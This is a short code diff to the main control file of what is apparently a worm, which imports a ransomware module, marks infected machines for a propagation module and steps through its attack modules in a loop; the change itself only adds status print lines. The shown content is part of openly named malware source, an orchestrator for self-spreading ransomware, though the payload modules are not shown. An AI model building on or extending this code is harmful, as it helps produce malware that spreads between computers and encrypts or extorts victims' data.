@@ -21,8 +21,6 @@ from modules import ransomware
 
 
 def main(start_module):
-    print("Worm just landed!")
-
     # Creates a file for the propagation module to identify whether a computer is already infected or not
     PUBLIC_IP = os.environ.get("USER")
 
@@ -53,11 +51,14 @@ def main(start_module):
         "ransomware": ransomware.run,
     }
 
+    print("[+] Modules initialized")
+
     # First step
     next_step = start_module
     result = None
 
     while next_step != "clean":
+        print(f"[+] Active module: {next_step}")
         # Execute module and get result and next step
         if next_step == "instructions":
             result, next_step = modules[next_step](PUBLIC_IP)
